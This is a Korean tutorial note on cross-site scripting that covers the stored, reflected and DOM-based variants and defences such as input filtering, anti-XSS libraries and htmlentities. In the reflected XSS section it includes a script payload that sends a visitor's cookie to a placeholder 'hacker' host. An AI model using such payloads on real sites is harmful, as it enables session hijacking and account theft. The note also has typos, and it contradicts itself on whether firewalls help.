# XSS (Cross-Sit Scripting) 이란?
## 1. 개요   
![img_5.png](img_5.png)  
  - XSS Attack
  XSS(Cross-Site Scripting) 이란 웹 어플리케이션에서 일어나는 취약점으로 관리자가 아닌 권한이 없는 사용자가 웹 사이트에 스크립트를 삽입하는 공격 기법이다.
  XSS 공격 역시 OWASP Top10에 포함되어 있다. 
  대부분 사용자가 글을 쓰고 읽을 수 있는 게시판에 많이 발생하지만, 사용자의 입력값을 웹 페이지에 보여주는 곳에서도 발생한다.
  악의적인 사용자가 `C&C` 서버로 리다이렉션 하기 위해 리다이렉션 스크립트를 주입하여 중간 경유지로 활용하기도 하고, 사용자의 쿠키를 탈취하여 세션 하이재킹(`Session Hijacking`)공격을 수행하기도 합니다.  
  위의 사진은 `XSS` 공격중 `Persistent`(or `Stored`) `XSS Attack`이고, 사용자의 세션을 탈취하는 프로세스를 나타내고 있다. 해커가 `XSS`공격에 취약한 웹사이트에 악의적인 스크립트를 삽입하고, 그 스크립트가 있는 게시글을 열람한 사용자는 악성스크립트로 인해본인의 쿠키가 해커에게 전송되게 된다. 세션ID가 포함된 쿠키를 탈취한 해커는 탈취한 사용자의 계정으로 로그인 하게 된다.
  

  - 흔히 사이트의 게시판의 게시글 작성 시 내용에 스크립트 코드를 삽입하여 게시글을 읽는 사용자의 쿠키정보를 탈취 하거나 악성프로그램 다운로드, 공격자가 의도한 URL로 이동시키는 등 개발자가 의도하지 않은 기능을 동작하도록 만든다.
  

  - XSS의 공격 방식은 크게 `Reflected XSS`, `Stored XSS`, `DOM Based XSS` 세 가지로 분류할 수 있다.

-----  
## 2. 공격 종류 및 방법
  ### 2.1 지속형( 혹은 저장형) XSS 공격  
![img_6.png](img_6.png)  
- Persistent (or Stored) XSS

`XSS` 공격 종류 중 하나인 `Persistent XSS`는 말 그대로 지속적으로 피해를 입히는 `XSS` 공격이다.  
위의 그림을 보면, 해커는 웹 어플리케이션에서 XSS 취약점이 있는 곳을 파악하고, 악성스크립트를 삽입한다. 삽입된 스크립트는 데이터베이스에 저장이 되고, 저장된 악성스크립트가 있는 게시글 등을 열람한 사용자들은 악성스크립트가 작동하면서 쿠키를 탈취당한다던가, 혹은 다른 사이트로 리다이렉션 되는 공격을 받게 된다. 데이터 베이스에 저장이 되어 지속적으로 공격당한다고 하여 `Persistent XSS` 라고 부르며, 데이터베이스에 저장이 되므로 `Stored XSS`공격이라고 부르기도 한다. 한번의 공격으로 악성스크립트를 삽입하여 수많은 피해를 입힐 수 있다는 점이 특징이다.  

`Persistent XSS`로 가장 많이 공격이 되는 곳은 게시판이며, 굳이 게시판이 아니더라도 사용자가 입력한 값이 데이터베이스에 저장이 되고, 저장된 값이 그대로 프론트엔드 단에 보여주는 곳에 공격이 성공할 가능성이 큽니다. XSS 공격도 마찬가지로 사용자의 입력에 대한 검증이 없기 때문에 발생합니다.  
 - `Stored XSS`는 `Reflected XSS`와는 달리 웹 사이트의 게시판에 스크립트를 삽입하는 공격 방식이다.  
공격자는 게시판에 스크립트를 삽입한 후 공격 대상자가 해당 게시글을 클릭하도록 유도한다.  
![img_12.png](img_12.png)  
`Stroed XSS`는 `Reflected XSS`와는 달리 웹 사이트의 게시판에 스크립트 삽입하는 공격 방식이다.  
공격자는 게시판에 스크립트를 삽입한 후 공격 대상자가 해당 게시글을 클릭하도록 유도한다.  
공격자가 미리 XSS 공격에 취약한 웹사이트를 탐색하고 XSS 공격을 위한 스크립트를 포함한 게시글을 웹 사이트에 업로드 한다.  
게시글을의 URL을 사용자에게 노출하고 사용자가 게실글을 확인함으로써 URL에 대한 요청을 서버에 전송하게 된다.  
웹 서버에서 스크립트를 포함한 `Response`를 전송하여 공격이 수행된다.


  ### 2.2 반사형 XSS 공격  
![img_7.png](img_7.png)  
 - Reflected XSS  
`Reflected XSS` 공격은 사용자에게 입력 받은 값을 서버에서 되돌려 주는 곳에서 발생합니다. 예를 들면 사용자에게 입력 받은 검색어를 그대로 보여주는 곳이나 사용자가 입력한 값을 에러 메시지에 포함하여 보여주는 곳에 악성 스크립트가 삽입되면, 서버가 사용자의 입력 값을 포함해 응답해 줄 때 스크립트가 실행된다. 보통 `Reflected XSS`는 공격자가 악의적인 스크립트와 함께 `URL`을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악의적인 스크립트가 실행되면서 공격당하게 된다.  
예를 들면, GET방식으로 검색기능을 구현한 웹 어플리케이션에 XSS 취약점이 있음을 확인한 해커를 공격코드를 작성하였습니다. 편의상 URL 인코딩은 하지 않습니다.  
 - 
```javascript
http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script> 
```  
악의적인 스크립트를 살펴보면 검색 인자로 작성한 스크립트를 넘겨준다.  
해당 스크립트의 내용은 본인의 웹페이지로 URL을 클릭한 사용자의 쿠키 값이 전송되도록 되어 있다.링크를 클릭한 사용자는 해커한테 본인의 의도와는 상관없이 자신의 쿠키 값을 전송하게 된다.  

![img_9.png](img_9.png)  

위와 같이 ID를 입력하면 "Welcome OOO!!"를 출력해주는 페이지가 있다고 했을때.  

![img_10.png](img_10.png)  

이 페이지에 간단한 스크립트를 삽입하면 별다른 필터링 없이 실행이 되는 것을 확인할 수 있다.  
공격자는 이러한 취약점이 존재하는 페이지를 미리 탐색한 후,  XSS 공격을 위한 스크립트가 포함 된 URL을 공격 대상자에게 노출 시키는 방법으로 공격을 수행 할 수 있다.  
  
`Reflected XSS`의 공격 순서는 다음과 같다.  

![img_11.png](img_11.png)  

공격자가 미리 XSS 공격에 취약한 웹 사이트를 탐색하고, XSS 공격을 위한 스크립트를 포함한 URL을 사용자에게 노출시킨다.  

사용자가 해당 URL을 클릭 할 경우, 취약한 웹 사이트의 서버에 스크립트가 포함 된 URL을 통해 `Request`를 전송하고, 웹 서버에서는 해당 스크립트를 포함한 `Response`를 전송하게 된다.   


  ### 2.3 DOM(Document Object Model)기반 XSS 공격
![img_8.png](img_8.png)
  - DOM based XSS  
`DOM based XSS` 는 악의적인 스크립트가 포함 된 URL을 사용자가 요청하게 되어 브라우저를 해석하는 단계에 발생하는 공격입니다. 악의적인 스크립트로 인해서 클라이언트 측 코드가 원래 의도와는 다르게 실행된다.  
`DOM based XSS`공격은 다른 XSS 공격과는 다르게 서버측에서 탐지가 어렵다는 점입니다.  
위의 그림을 보면 해커는 `http://www.some.site/page.html` URL과 함께 # 이라는 특수문자를 사용하고 있습니다.  
이 특수문자는 # 이후의 값은 서버로 전송되지 않는 기능을 가지고 있습니다.  
```javascript
<select><script>

document.write( "<OPTION value = 1>" +document.location.href.substring (document.location.href.indexOf ( "default=") + 8)
                + "</OPTION>");
document.write( "<OPTION value = 2> 영어 </OPTION>");
        
        </script></select>
//-------------------------------------------------------------------------
//                                      ▲
//                                      ▲
//                      http://www.some.site/page.html#default = 
//                      <script> alert (document.cookie) </scirpt>
```  
  - DOM based XSS 공격 위치
사용자의 요청에 따라 HTML을 다르게 해석하는 부분에 공격이 가능합니다.

  ### 3 대응방안
  xSS  공격은 `IPS`,`IDS`, 방화벽 등오로도 방지할 수가 없다.  
때문에 단순히 문자를 필터링 하는 등의 방법만이 존재한다.
  - 입출력 값 검증  
사용자가 입력한 값에 대한 검증과 사용자가 입력한 값을 그대로 출력할 때 검증이 필요하다.
`XSS Cheat Sheet` 에 대한 필터 목록을 만들어 모든 `Cheat Sheet`에 대한 대응이 가능하도록 하여야 한다.  
`XSS`에 대한 필터링을 적용한 뒤 직접 테스트하여 스크립트가 실행되는지 모의해킹 해보는 것도 좋은 방법이다.  
    - XSS 공격은 입력 값에 대한 검증이 제대로 이루어지지 않아 발생하는 취약점이다.  
    때문에 사용자의 모든 입력값에 대하여 서버측에서 필터링을 해 주어야 한다.  
    PHP의 `eregi`함수를 이용하면 XSS 공격에 주로 사용되는 문자들을 필터링 할 수 있다.  
    주로 스크립트를 실행하기 위한 특수문자를 필터링 하며, `<`,`>`,`"`,"`"등의 문자가 있다.

  - XSS 방어 라이브러리, 브라우저 확장앱 사용  
`XSS`를 막아주는 `Anti XSS` 라이브러리를 여러 회사에서 제공하는데 이 라이브러리를 사용하면 손쉽게 XSS를 방어할 수 있다.
XSS 라이브러리를 사용하는 것은 서버 단에서 개발자가 추가하는 것이고, 사용자들이 각자 본인의 브라우저에서 악의 적인 스클비트가 실행되지 않도록 방어하는 것이 중요하다.
방문하는 모든 사이트가 안전하다는 보장이 없기 때문에 브라우저 확장 앱 중 Anti XSS를 해주는 어플리케이션을 설치하고 방어하여야 한다.
  - 웹 방화벽 사용  
웹 방화벽은 웹 공격에 특화 되어 있기 때문에 XSS 공격을 방어하기 위함만이 아니라 각종 Injection 공격을 효과적으로 방어할 수 있다.
  - htmlentities 사용  
 PHP 함수 중 `htmlentities` 라는 함수가 있다.  
`htmlentities`는 모든 특수문자를 HTML 엔티티(entity)로 변환한다. 